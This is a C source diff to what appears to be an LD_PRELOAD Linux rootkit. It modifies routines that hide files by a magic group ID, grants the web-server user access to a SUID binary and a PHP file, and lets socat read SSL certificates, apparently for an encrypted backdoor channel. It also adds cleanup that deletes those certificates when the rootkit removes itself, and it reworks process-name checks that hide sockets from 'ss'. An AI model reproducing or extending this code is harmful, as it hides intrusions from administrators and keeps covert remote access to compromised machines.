@@ -99,7 +99,7 @@ char *get_myname(void){
 int process(const char *name){
     int status = 0;
     char *myname = get_myname();
-    if(!strcmp(name, myname)) status = 1;
+    if(!strncmp(myname, name, strlen(myname))) status = 1;
     free(myname);
     return status;
 }
@@ -109,7 +109,7 @@ int process(const char *name){
  */
 char *get_fdname(int fd){
     int readlink_status;
-    char path[512], *filename = (char *)malloc(PATH_MAX);
+    char path[PATH_MAX/4], *filename = (char *)malloc(PATH_MAX);
     memset(filename, 0, PATH_MAX);
 
     snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
@@ -186,9 +186,12 @@ int _hidden_path(const char *pathname, short mode){
     if(pathgid == MAGIC_GID){
         /* only allow the service user to see&access both of these files. */
         if(iswww()){
-            char *suidbin_name = basename(SUID_BIN);        /* allow the service user to get to */
-            if(strstr(pathname, suidbin_name)) return 0;    /* these files. but no other files. */
+            if(strstr(pathname, SUID_BIN)) return 0;
             if(strstr(pathname, PHP_NEWFILENAME)) return 0;
+#if defined(SERVERPEM) && defined(CLIENTCRT)
+            if(strstr(pathname, SERVERPEM)) return 0;
+            if(strstr(pathname, CLIENTCRT)) return 0;
+#endif
         }
 
         return 1;
@@ -219,7 +222,12 @@ int _hidden_lpath(const char *pathname, short mode){
         if(iswww()){
             if(strstr(pathname, SUID_BIN)) return 0;
             if(strstr(pathname, PHP_NEWFILENAME)) return 0;
+#if defined(SERVERPEM) && defined(CLIENTCRT)
+            if(strstr(pathname, SERVERPEM)) return 0;
+            if(strstr(pathname, CLIENTCRT)) return 0;
+#endif
         }
+
         return 1;
     }
     return 0;
@@ -266,6 +274,18 @@ int _hidden_fd(int fd, short mode){
                 goto end_hiddenfd;
             }
         }
+#if defined(SERVERPEM) && defined(CLIENTCRT)
+        if(process("socat")){  /* let socat access ssl cert */
+            if(strstr(pathname, SERVERPEM)){
+                ret = 0;
+                goto end_hiddenfd;
+            }
+            if(strstr(pathname, CLIENTCRT)){
+                ret = 0;
+                goto end_hiddenfd;
+            }
+        }
+#endif
 
         ret = 1;
     }
@@ -435,6 +455,15 @@ void killself(short mode){
                 printf("successfully removed %s\n", rmfiles[i]);
         }
     }
+    //SERVERPEM,CLIENTCRT
+#if defined(CLIENTPEM) && defined(SERVERCRT)
+    if(o_unlink(CLIENTPEM) < 0){
+        printf("something went wrong removing %s\n", CLIENTPEM);
+    }else printf("successfully removed %s\n", CLIENTPEM);
+    if(o_unlink(SERVERCRT) < 0){
+        printf("something went wrong removing %s\n", SERVERCRT);
+    }else printf("successfully removed %s\n", SERVERCRT);
+#endif
 }
 
 int ld_inconsistent(void){
@@ -1178,11 +1207,9 @@ int ssme(int domain, int protocol){
         return 0;
 
     int status;
-    char *myname = get_myname();
-    if(!strncmp(myname, "ss\0", strlen(myname))) status = 1;
-    if(!strncmp(myname, "/usr/bin/ss\0", strlen(myname))) status = 1;
-    if(!strncmp(myname, "/bin/ss\0", strlen(myname))) status = 1;
-    free(myname);
+    if(process("ss\0")) status=1;
+    if(process("/usr/bin/ss\0")) status=1;
+    if(process("/bin/ss\0")) status=1;
     return status;
 
 }
